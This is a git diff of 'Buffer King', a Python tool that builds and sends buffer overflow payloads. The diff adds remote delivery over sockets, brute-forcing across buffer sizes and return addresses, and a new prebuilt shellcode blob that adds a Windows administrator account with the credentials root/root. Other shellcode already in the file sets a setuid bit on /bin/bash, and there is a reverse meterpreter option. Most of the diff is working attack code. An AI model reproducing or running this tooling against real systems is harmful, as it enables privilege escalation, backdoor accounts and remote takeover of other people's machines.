@@ -33,6 +33,7 @@ titlepage = \
 # Temp
 def ud():
     print("Feature under development")
+    input("\nPress ENTER to continue\n")
 
 ########################################################################################################
 # Imports
@@ -44,14 +45,16 @@ import platform
 import subprocess
 import string
 import re
+import socket
+import select
 from itertools import product
 
 ########################################################################################################
 # Argparser
 ########################################################################################################
 
-global parser
-parser = argparse.ArgumentParser(description=f"Tool for overflowing buffers \n{ud()}")
+#global parser
+#parser = argparse.ArgumentParser(description=f"Tool for overflowing buffers \n{ud()}")
 # parser.add_argument
 
 
@@ -71,12 +74,13 @@ class exploit:
         self.local_os = None
         self.target_os = None
         self.is_local = None
-        self.nc_or_socket = None
         self.target_exe = None
+        self.target_ip = None
+        self.target_port = None
         self.trigger_command = None
         self.buffer_size = None
         self.has_canary = None  # ud()
-        self.target_eip = None
+        self.target_eip = []
         self.prepend_nop_count = None
         self.append_nop_count = None
         self.shellcode = None
@@ -98,7 +102,7 @@ class exploit:
         """
         Print a brief description of the exploit
         """
-        self.payload_generator()
+        self.payload_generator(self.buffer_size, self.target_eip[0])
         return "\n" + \
               f"Is Local: {self.is_local}\n" + \
               f"Target exe: {self.target_exe}\n" + \
@@ -138,31 +142,103 @@ class exploit:
         input("\n\nPress ENTER to continue")
 
 
-    def find_buffer_size(self):
+    def get_trigger(self):
+        response = get_input("\n#|| Do you need to prepend a specific command " + \
+            "to trigger the vulnerability? (y/[n]):\n",["y","n",""],default="n")
+        if yn_key[response]:
+            self.trigger_command = input("\n#|| Enter the command:\n").strip()
+        else:
+            self.trigger_command = "NA"
+
+
+    def get_buffer_size(self):
         """
         Find the buffer size to trigger a buffer overflow
         """
-        # Linux process is easy, Windows not as much
-        if self.local_os == "linux":
-            print("\n[*] Getting buffer size...")
-            for size in range(100,5000,50):
-                if size % 100 == 0: print(f"\t[*] Trying with pattern of size {size}")
-                pattern = gen_pattern(size)
-                p1 = subprocess.Popen([self.target_exe], stdin=subprocess.PIPE, stdout=subprocess.PIPE, \
-                    stderr = subprocess.STDOUT, shell=True, universal_newlines=True)
-                output = p1.communicate(input=pattern)[0]
-                if "segmentation" in output.lower():
-                    print("\t[*] Successfully triggered overflow. Calculating offset...")
-                    successful_pattern = gen_pattern(size)
-                    break
-            if not successful_pattern:
-                print("\n#|| Unable to trigger overflow. Please calculate the offset " + \
-                "manually and return")
-                quit()
-            check_dmesg(self, successful_pattern)
+        response = get_input("\n#|| Do you know your target's buffer size? (y/[n]):\n", \
+            ["y","n",""],default="n")
+        if yn_key[response]:
+            response = get_input("\n#|| Enter buffer size:\n",[str(i) for i in range(10000)])
+            self.buffer_size = int(response)
+            return
         else:
-            # if local os is windows:
-            ud()
+            if self.is_local:
+                # Linux process is easy, Windows not as much
+                if self.local_os == "linux":
+                    print("\n[*] Getting buffer size...")
+                    for size in range(100,5000,50):
+                        if size % 100 == 0: print(f"\t[*] Trying with pattern of size {size}")
+                        pattern = gen_pattern(size)
+                        p1 = subprocess.Popen([self.target_exe], stdin=subprocess.PIPE, stdout=subprocess.PIPE, \
+                            stderr = subprocess.STDOUT, shell=True, universal_newlines=True)
+                        output = p1.communicate(input=pattern)[0]
+                        if "segmentation" in output.lower():
+                            print("\t[*] Successfully triggered overflow. Calculating offset...")
+                            successful_pattern = gen_pattern(size)
+                            break
+                    if not successful_pattern:
+                        print("\n#|| Unable to trigger overflow. Please calculate the offset " + \
+                        "manually and return")
+                        return
+                    check_dmesg(self, successful_pattern)
+                else:
+                    # if local os is windows:
+                    ud()
+            else:
+                print("\n#|| Manual entry is currently the only supported way of " + \
+                    "determining the buffer size for remote exploits\n") 
+                self.get_buffer_size()
+
+
+    def get_target_eip(self):
+        """
+        Find the target eip
+        """
+        """
+        Needs change
+        Should have two paths -- already has at least one EIP or has no EIPS
+            would you like to add more?
+                keep adding until user wants to stop
+            do you know your EIP? (you need to lol)
+                keep adding until user wants to stop
+        """
+        if len(self.target_eip) > 0:
+            print("\n#|| Your exploit currently has the following target EIPs saved:\n")
+            for i in range(len(self.target_eip)):
+                print(f"{i}:\t{self.target_eip[i]}")
+            response = yn_key[get_input("\n#|| Would you like to add more target EIPs? (y/[n]):\n", \
+                ["y","n",""], default="n")]
+        else:
+            print("\n#|| Your exploit currently has no target EIPs\n")
+            response = True
+
+        if response:
+            print("\n#|| Correct EIP format examples: 625012a0 (32-bit) or ffffffff625012a0 (64-bit)")
+            while True:
+                response = input("\nEnter your next target EIP or \"b\" to go back:\n").strip()
+                if response == "b" and (len(self.target_eip) > 0):
+                    break
+                elif response == "b":
+                    print("\n#|| Sorry, you must have at least one target EIP!\n")
+                else:
+                    if re.search(r"[a|b|c|d|e|f|\d]{8}",response) or \
+                        re.search(r"[a|b|c|d|e|f|\d]{16}",response):
+                        self.target_eip.append(response)
+                    else:
+                        print("\n#|| Sorry, format not understood\n")
+        
+
+    def get_nop_counts(self):
+        count_options = [str(2*n) for n in range(1000)]
+        count_options.append("")
+        if not self.prepend_nop_count:
+            response = get_input("#|| How many NOPS would you like to prepend? " + \
+            "(Enter a multiple of 2) [16]\n",count_options, default="16") 
+            self.prepend_nop_count = int(response)
+        if not self.append_nop_count:
+            response = get_input("#|| How many NOPS would you like to append? " + \
+            "(Enter a multiple of 2) [16]\n",count_options, default="16") 
+            self.append_nop_count = int(response)
 
 
     def set_shellcode(self):
@@ -180,8 +256,10 @@ class exploit:
                 available = { \
                             "linux: chmod u+s /bin/bash (prebuilt, no msfvenom required)": \
                                 ("Preset","Preset","Preset"),
-                            "linux: chmod u+s /bin/bash":("linux/x86/exec","CMD=\"chmod u+s /bin/bash\"", \
-                                "\\x00\\x0a\\x0d"), \
+                            "windows: add Administrator account (u:root/p:root) (prebuilt, no " + \
+                                "msfvenom required)":("Preset","Preset","Preset"),
+                            "linux: chmod u+s /bin/bash":("linux/x86/exec","CMD=\"chmod u+s " + \
+                                "/bin/bash\"", "\\x00\\x0a\\x0d"), \
                             "windows: reverse meterpreter":("windows/meterpreter/reverse_tcp", \
                                 "LHOST=[] LPORT=[]", "\\x00\\x0a\\x0d") \
                             }
@@ -197,8 +275,20 @@ class exploit:
                 if response == "b":
                     continue
                 elif response == "0":
-                    self.shellcode = "6a0b58995266682d6389e7682f736800682f62696e89e352e81400000063686d6f6420752b73202f6" + \
-                    "2696e2f6261736800575389e1cd80"
+                    self.shellcode = \
+                        "6a0b58995266682d6389e7682f736800682f62696e89e352e81400000063686d6f6420752b73202f6" + \
+                        "2696e2f6261736800575389e1cd80"
+                    break
+                elif response == "1":
+                    self.shellcode = \
+                        "ba19a5b4d8d9cbd97424f45f2bc9b14783effc31570f035716474124c005aad5106a223021aa5030" + \
+                        "111a12149dd1768d16975ea29f12b98d200ef98ca24d2e6f9b9d236edcc0ce22b58f7dd3b2da" + \
+                        "bd5888cbc5bd58ede413d3b4269530cd6e8d55e83926ad86bbeefc6717cf319a6917f5451c6106" + \
+                        "fb27b67527ad2dddac158adc61c359d2ce8706f6d1443d02596b9283194836c8faf16fb4ad0e6f" + \
+                        "1711abfbb546c6a1d39954dc919a66df85f257544a8467bf2f7a22e21913eb76187e0cad5e878f" + \
+                        "441e7c8f2c1b3817dc5151f2e2c652d79387dbbd21244c5baaa6a2c64a539b46eecffb03a3aaa9" + \
+                        "8b315b21b895d1d22fa23502d12e517c3ed6b9532550c9c2d7c55a2f7663ea2af4505cf0ac862c" + \
+                        "b50f86e00ec247adc0c216298c6bf7d83d18757bb68f0b081622838122e2743caf868a"
                     break
                 else:
                     i = int(response)
@@ -227,16 +317,14 @@ class exploit:
                         "Note:Error-checking is limited here, enter input carefully\n").strip()
                     args = input("\nEnter any payload arguments: (e.g. LHOST=8.8.8.8 LPORT=4444)\n").strip()
                     bad_chars = input("\nEnter any bad characters: (e.g. \"\x00\x0a\x0d\")\n").strip()
-                    check = get_input("\nDoes your input look correct? ([y]/n):\n",["y","n",""],default="y")
-                    if check == "y":
+                    if check_input():
                         break
                 self.shellcode = get_venom(payload, args, bad_chars)
                 break
             else:
                 while True:
                     payload = input("\nPaste your shellcode as a single line. Omit any quotes.\n")
-                    check = get_input("\nDoes your input look correct? ([y]/n):\n",["y","n",""],default="y")
-                    if check == "y":
+                    if check_input():
                         break
                 self.shellcode = payload.replace("\\x","")
                 break
@@ -261,7 +349,7 @@ class exploit:
         print(f"\n[*] Identified local OS as: {self.local_os.capitalize()}\n")
 
         # Is it local?
-        if not self.is_local:
+        if self.is_local == None:
             response = get_input("#|| Is your target local? ([y]/n):\n", ["y","n",""],default="y")
             self.is_local = yn_key[response]
 
@@ -270,49 +358,63 @@ class exploit:
             if not self.target_exe:
                 self.target_exe = get_filepath("of your target",already_exists=True)
             if not self.trigger_command:
-                response = get_input("\n#|| Do you need to prepend a specific command " + \
-                "to trigger the vulnerability? (y/[n]):\n",["y","n",""],default="n")
-                if yn_key[response]:
-                    self.trigger_command = input("#|| Enter the command:\n").strip()
+                self.get_trigger()
             if not self.buffer_size:
-                response = get_input("#|| Do you know your target's buffer size? (y/[n]):\n", \
-                ["y","n",""],default="n")
-                if yn_key[response]:
-                    response = get_input("#|| Enter buffer size:\n",[str(i) for i in range(10000)])
-                    self.buffer_size = int(response)
-                else:
-                    self.find_buffer_size()
-            if not self.target_eip:
-                ud()
-            count_options = [str(2*n) for n in range(1000)]
-            count_options.append("")
-            if not self.prepend_nop_count:
-                response = get_input("#|| How many NOPS would you like to prepend? " + \
-                "(Enter a multiple of 2) [16]\n",count_options, default="16") 
-                self.prepend_nop_count = int(response)
-            if not self.append_nop_count:
-                response = get_input("#|| How many NOPS would you like to append? " + \
-                "(Enter a multiple of 2) [16]\n",count_options, default="16") 
-                self.append_nop_count = int(response)
+                self.get_buffer_size()
+            self.get_target_eip()
+            if not self.prepend_nop_count or not self.append_nop_count:
+                self.get_nop_counts()
             if not self.shellcode:
                 self.set_shellcode()
         else:
             # get info for remote buffer overflow exploits
-            ud()
+            print("\n#|| Remote buffer overflows require two stages: analysis and exploitation")
+            print("Note: Analysis module still under development\n")    # temp
+            if self.target_ip:
+                # IP has already been defined, indicating that definition has already happened
+                response = ""
+            else:
+                response = get_input("\n#|| Enter analysis module or exploitation module? (a/[e]):\n",
+                    ["a","e",""],default="e")
+            if response == "a":
+                ud()
+            elif response == "e":
+                while not self.target_ip:
+                    response = input("\n#|| Enter your target's IP address:\n").strip()
+                    if re.search(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", response):
+                        self.target_ip = response
+                    else:
+                        print("\n#|| Sorry, I didn't understand that\n")
+                if not self.target_port:
+                    response = get_input("\n#|| Enter the target port:\n",[str(i) for i in range(65536)])
+                    self.target_port = int(response)
+                if not self.trigger_command:
+                    self.get_trigger()
+                if not self.buffer_size:
+                    self.get_buffer_size()
+                self.get_target_eip()
+                if not self.prepend_nop_count or not self.append_nop_count:
+                    self.get_nop_counts()
+                if not self.shellcode:
+                    self.set_shellcode()
 
 
-    def payload_generator(self):
+    def payload_generator(self, buffer_size, target_eip):
         '''
         Generates the overflow-triggering message
         '''
         # put EIP in correct order
         eip = ""
-        for i in range(len(self.target_eip)):
+        for i in range(len(target_eip)):
             if i % 2 == 0:
-                eip = self.target_eip[i:i+2] + eip
+                eip = target_eip[i:i+2] + eip
 
         if not self.has_canary:
-            msg = "41"*self.buffer_size
+            if not self.trigger_command or self.trigger_command == "NA":
+                msg = "41"*buffer_size
+            else:
+                msg = "".join([str(hex(ord(char))).replace("0x","") for char in self.trigger_command])
+                msg += "41"*(buffer_size - len(self.trigger_command))
             msg += eip
             msg += "90"*self.prepend_nop_count
             msg += self.shellcode
@@ -331,8 +433,9 @@ class exploit:
             # All local exploits
             if self.local_os == "linux":
                 # Local Linux
-                if self.buffer_size and self.target_eip and self.prepend_nop_count and self.shellcode and \
-                    self.append_nop_count:
+                if self.buffer_size and (len(self.target_eip)>0) and \
+                    self.prepend_nop_count and self.shellcode \
+                    and self.append_nop_count:
                     cmd_string = self.target_exe
                     sudo = yn_key[get_input("\nShould I run command as sudo? ([y]/n)\n", \
                         ["y","n",""],default="y")]
@@ -346,35 +449,64 @@ class exploit:
             # Back to all local exploits
         elif self.is_local == False:
             # All remote exploits
-            ud()
+            if self.target_ip and self.target_port and \
+                self.buffer_size and (len(self.target_eip)>0) \
+                and self.prepend_nop_count and self.shellcode and self.append_nop_count:
+                pass
+            else:
+                print(missing)
+                return
         else:
             # .is_local failed to be defined
             print(missing)
             return
 
-        num = int(get_input("\nEnter your eip confidence interval: ([1]-1000)\n" + \
-            "Inverse scale -- larger confidence interval means more attempts\n" + \
+        buffer_interval = int(get_input("\nEnter a confidence interval for your buffer size: " + \
+            "([1]-1000)\n" + \
+            "For interval = n, I will conduct an attempt for every buffer size in range " + \
+            "(nominal - n, nominal + n)\n", \
+            [str(i) for i in range(1,1001)],default="1"))
+
+        eip_interval = int(get_input("\nEnter a confidence interval for your target EIP: " + \
+            "([1]-1000)\n" + \
+            "For interval = n, I will conduct an attempt for every EIP in range " + \
+            "(nominal - (1 byte)*n, nominal + (1 byte)*n)\n" + \
             "For interval = n, I will conduct 2*(n+1) attempts\n", \
             [str(i) for i in range(1,1001)],default="1"))
 
         print("\n[*] Sending payload(s)!")
 
-        # Save current eip
-        original_eip = self.target_eip
         # the given eip will be run twice (add zero, subtract zero)
         responses = []
-        for n in range(num+1):
-            for num in [-n,n]:
-                # Add n bytes to eip and run
-                self.target_eip = str(hex(int(original_eip,16) + 8*num)).replace("0x","")
-                self.payload_generator()
-                p = subprocess.Popen([cmd_string], stdin=subprocess.PIPE, \
-                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
-                out = p.communicate(input=self.payload)[0].decode()
-                responses.append("".join(out.split("\n")[-2:]))
-                print("\t[*] Sent!")
-        # Restore original target_eip
-        self.target_eip = original_eip
+
+        for buffer_size in range(self.buffer_size - buffer_interval, \
+            1+self.buffer_size+buffer_interval):
+            for eip in self.target_eip:
+                for n in range(1+eip_interval):
+                    for num in [-n,n]:
+                        current_eip = str(hex(int(eip,16) + 8*num)).replace("0x","")
+                        self.payload_generator(buffer_size, current_eip)
+                        if self.is_local:
+                            p = subprocess.Popen([cmd_string], stdin=subprocess.PIPE, \
+                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+                            out = p.communicate(input=self.payload)[0].decode()
+                            responses.append("".join(out.split("\n")[-2:]))
+                            print("\t[*] Sent!")
+                        else:
+                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            try:
+                                s.connect((self.target_ip, self.target_port))
+                                s.send(self.payload)
+                                # Retrieve message if one is sent back
+                                s.setblocking(0)
+                                ready = select.select([s],[],[],0.1)
+                                if ready[0]:
+                                    out = s.recv(8192)
+                                responses.append("".join(out.decode().split("\n")[-2:]))
+                                print("\t[*] Sent!")
+                            except:
+                                print("\t[*] ERROR Sending (Most likely a refused connection)")
+
         show = get_input("\nSaved last line of output from each attempt. View now? (y/[n])\n", \
             ["y","n",""], default="n")
         if yn_key[show]:
@@ -431,12 +563,11 @@ def check_dmesg(exp, successful_pattern):
             ip = input("#|| Enter the IP (hex value only):\n") 
             print("#\n|| SP should look like: `ffffe5b8` (value chosen arbitrarily)")
             sp = input("#|| Enter the SP (hex value only):\n")
-            check = get_input("#|| Does your input look correct? ([y]/n):\n",["y","n",""],default="y")
-            if check == 'y':
+            if check_input():
                 break                        
-    exp.target_eip = sp
+    exp.target_eip.append(sp)
     exp.buffer_size = calculate_offset(successful_pattern, ip)
-    print(f"[*] Identified buffer size as {exp.buffer_size} and target EIP as {exp.target_eip}")
+    print(f"[*] Identified buffer size as {exp.buffer_size} and target EIP(s) as {exp.target_eip}")
 
 
 def get_venom(payload, args, bad_chars):
@@ -502,7 +633,6 @@ def exploit_handler(exp):
             input("\nPress ENTER to go back\n")
         elif choice == 1:
             ud()
-            input("\nPress ENTER to go back\n")
         elif choice == 2:                
             exp.save()
         elif choice == 3:
@@ -525,9 +655,8 @@ def main_menu():
                   ]
         choice = get_menu_choice("Main Menu",options,default="1")
         if choice == 0:
+            #parser.print_help()
             ud()
-            parser.print_help()
-            input("\nPress ENTER to continue")
         elif choice == 1:
             print("Beginning New Exploit...")
             exploits.append(exploit())
@@ -556,11 +685,25 @@ def main_menu():
 ########################################################################################################
 
 
+def check_input():
+    """
+    Asks user to verify their own input
+    """
+    return yn_key[get_input("#|| Does your input look correct? ([y]/n):\n",["y","n",""],default="y")]
+
+
 def get_intended_type(string):
     """
     Takes a string, returns the intended value/data type. Used for reading in a settings file
     """
-    if string=="None":
+    if re.search(r"\[.*\]", string):
+        split = re.split(r"\"|\'",string)
+        result = []
+        for i in range(1,len(split)-1):
+            if re.search(r"^,\s*", split[i+1]):
+                result.append(split[i])
+        return result
+    elif string=="None":
         return None
     elif string=="True":
         return True
@@ -730,12 +873,17 @@ if __name__ == "__main__":
 
 
     # Welcome Page, only displays on start
+    clear_screen()
     print(titlepage)
     welcome = \
           "Buffer King can be run through the interactive menu, with command line switches, or a" + \
           " combination of the two. To see the command line switches, type \"Help\" or run" + \
           " `./bufferking.py -h` from the command line. Otherwise, press enter to begin " + \
-          "the interactive menu, or type \"Exit\" to exit"
+          "the interactive menu, or type \"Exit\" to exit" + \
+          "\n\nStatement above reflects a future state of the program. For now, just press ENTER." + \
+          "\nThe claimed functionality will be added soon."
     print_block(welcome, pagewidth, border_line, 8)
+    input("\nPress ENTER to continue\n")
+    clear_screen()
 
     main_menu()
